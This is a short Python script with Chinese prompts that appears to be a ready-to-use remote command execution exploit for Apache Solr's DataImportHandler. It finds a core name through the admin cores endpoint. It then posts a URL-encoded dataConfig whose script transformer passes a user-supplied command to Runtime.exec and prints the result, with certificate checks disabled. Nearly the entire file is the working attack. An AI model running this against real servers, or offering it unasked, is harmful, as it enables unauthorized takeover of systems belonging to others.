import re
import  requests
requests.packages.urllib3.disable_warnings()
print("示例:https://xxx.xxx.xxx.xxx:xxx")
url = input("请输入网址:")
url1 = "/solr/admin/cores"
rs = requests.get(url + url1, verify=False)
if(rs.status_code == 200):
    response = rs.text
    result = re.search(r'str\sname=\"name\">(.*)</str><str\sname=\"instanceDir\">', response, re.M | re.S)
    cmd = input("请输入想要执行的命令:")
    url2 = "/solr/" + result.group(
        1) + "/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22" + cmd + "%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20"
    Data = {
        'stream.body': '''<?xml version="1.0" encoding="UTF-8"?>
            <RDF>
            <item/>
            </RDF>'''
    }
    try:
        rs = requests.post(url + url2, data=Data, verify=False)
        result1 = re.search(r'<arr name=\"title\"><str>(.*)</str></arr></lst></arr><lst\sname=\"verbose-output\"/>',rs.text, re.M | re.S)
        print(result1.group(1))
    except  Exception as e:
        print("命令错误无法执行或不存在此漏洞")
else:
    print("不存在此漏洞")




















